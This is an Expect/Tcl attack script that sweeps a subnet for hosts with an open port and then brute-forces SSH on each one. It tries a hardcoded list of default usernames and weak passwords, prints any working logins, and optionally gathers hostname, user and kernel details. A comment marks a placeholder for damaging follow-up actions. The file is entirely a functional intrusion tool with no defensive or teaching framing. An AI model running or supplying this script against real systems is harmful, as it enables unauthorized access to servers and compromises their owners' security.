#! /bin/expect

proc sshBruteForceList {} {
	global hosts
	
	puts "\nAttempting to brute force all found hosts"
	foreach host $hosts {	
		sshBruteForce $host
	}	
}

proc sshBruteForce {host} {
	set usernameList [list root toor admin test user] ;# try hostname if known
	set passwordList [list root toor admin test password password123 12345 123456789 asdf]

	foreach username $usernameList {
		foreach password $passwordList {
			set sshRtn [sshExpect $host $username $password]
			# return immediately if fatal or password found
			if {$sshRtn <= 0} {
				return $sshRtn
			}					
		}
	}
	puts "$host brute force failed"
	return 0
}

# rtn: -1 fatal, 1 denied, 0 found pass
proc sshExpect {host username password} {
	set timeout 5 ;# maybe longer on www
	log_user 0 ;# quiet mode
	set dumpServerInfo false

	set id [spawn ssh $username@$host]
	expect {
		-re "yes/no" {
			exp_send "yes\n"
			exp_continue
		}
		-re "(Permission denied|Connection refused|No route to host)" {
			close
			exp_wait
			return -1
		}
		-re "(P|p)assword" {
			exp_send "$password\n"
			expect {
				"Permission denied, please try again." {
					close
					exp_wait
					return 1
				}
				-re "(\\\$|#)" {
					puts "$username@$host password: $password"
					if {$dumpServerInfo} {					
						log_user 1
						send "hostname\n"
						expect -re "(\\\$|#)"

						send "whoami\n"
						expect -re "(\\\$|#)"

						send "uname -a\n"
						expect -re "(\\\$|#)"
						puts ""
					}

					################
					# fuck shit up
					################

					close
					exp_wait
					return 0
				}
				timeout {
					# have to enable log_user 1 at the start to debug
					puts "<<<<<<<<<< unkown match"
					send_user "$username@$host $password unkown expect match 1"
					close
					exp_wait
					return 1

				}

			} 
		}
		-re "(\\\$|#)" {
			# public key login
			puts "$host auto / pub key login"
			close
			exp_wait
			return 0
		}
		timeout {
			# have to enable log_user 1 at the start to debug
			puts "<<<<<<<<<< unkown match"
			send_user "$username@$host $password unkown expect match 2"
			close
			exp_wait
			return 1
		}
	}

	return 1
}


##
# Non free code below
# Modified by StickFigure
## 

# Scan a subnet for servers on the specified port.
#
proc scan {base port} {
  global nodes
  puts "Searching for hosts in subnet $base.0 on port $port"
  for {set ip 1} {$ip < 250} {incr ip} {
  	connect "$base.$ip" $port
  }
  set nodes $ip
}

# Connect asynchronously to a TCP service on the given port.
# Once connected (or once we fail) the handler will be called.
# If a host is up it returns pretty quickly. So use a short timout
# to give up on the others.
proc connect {host port} {
  set s [socket -async $host $port]
  fileevent $s writable [list ::connected $host $port $s]
  after 5000 [list shutdown $s]
  return
}

# Connection handler for the port scanner. This is called both
# for a successful connection and a failed connection. We can
# check by trying to operate on the socket. A failed connection
# raises an error for fconfigure -peername. As we have no other
# work to do, we can close the socket here.
#
proc connected {host port sock} {
	global hosts
  fileevent $sock writable {}
  set r [catch {fconfigure $sock -peername} info]
  if { ! $r } {
  	# port is open
 		puts $info
 		lappend hosts $host
  }
  shutdown $sock
}

proc shutdown {sock} {
  global nodes
  incr nodes -1
  catch {close $sock}
}

proc wait {varname} {
  while {[set $varname] > 1} {
  	vwait $varname
  }
}        

if {$::tcl_interactive} {
  puts "tcl_interactive not doing anything"
} else {
  eval [list scan] $argv
  wait ::nodes
	sshBruteForceList  
}
